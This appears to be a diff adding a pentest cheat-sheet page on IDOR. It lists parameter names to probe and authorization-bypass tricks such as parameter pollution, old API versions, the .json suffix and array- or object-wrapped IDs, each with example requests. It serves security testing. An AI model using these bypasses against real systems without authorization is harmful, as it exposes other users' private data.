@@ -1,0 +1,73 @@
+{
+    "title": "IDOR",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Basics",
+            "type": "code_block",
+            "content": [
+                "Check for valuable words:",
+                "{regex + perm} id",
+                "{regex + perm} user",
+                "{regex + perm} account",
+                "{regex + perm} number",
+                "{regex + perm} order",
+                "{regex + perm} no",
+                "{regex + perm} doc",
+                "{regex + perm} key",
+                "{regex + perm} email",
+                "{regex + perm} group",
+                "{regex + perm} profile",
+                "{regex + perm} edit"
+            ]
+        },
+        {
+            "heading": "Bypasses",
+            "type": "paragraph",
+            "content": "Add parameters onto the endpoints for example, if there was\n``text\nGET /apiv1/messages --> 401\nvs\nGET /apiv1/messages?userid=victimuuid --> 200\n`\n HTTP Parameter pollution\n`text\nGET /apiv1/messages?userid=VICTIMID --> 401 Unauthorized\nGET /apiv1/messages?userid=ATTACKERID&userid=VICTIMID --> 200 OK\nGET /apiv1/messages?userid=YOURUSERID[]&userid=ANOTHERUSERSID[]\n`\n Add .json to the endpoint, if it is built in Ruby!\n`text\n/userdata/2341 --> 401 Unauthorized\n/userdata/2341.json --> 200 OK\n`\n Test on outdated API Versions\n`text\n/v3/usersdata/1234 --> 403 Forbidden\n/v1/usersdata/1234 --> 200 OK\n`\nWrap the ID with an array.\n`text\n{“id”:111} --> 401 Unauthriozied\n{“id”:[111]} --> 200 OK\n`\nWrap the ID with a JSON object:\n`text\n{“id”:111} --> 401 Unauthriozied\n{“id”:{“id”:111}} --> 200 OK\n`\nJSON Parameter Pollution:\n`text\nPOST /api/getprofile\nContent-Type: application/json\n{“userid”:,”userid”:}\n``"
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2020-09-09T06:08:49.967Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/idor.md",
+        "previous_page": {
+            "title": "CRLF",
+            "url": "/enumeration/web/crlf"
+        },
+        "next_page": {
+            "title": "Web Cache Deception",
+            "url": "/enumeration/web/web-cache-deception"
+        }
+    }
+}
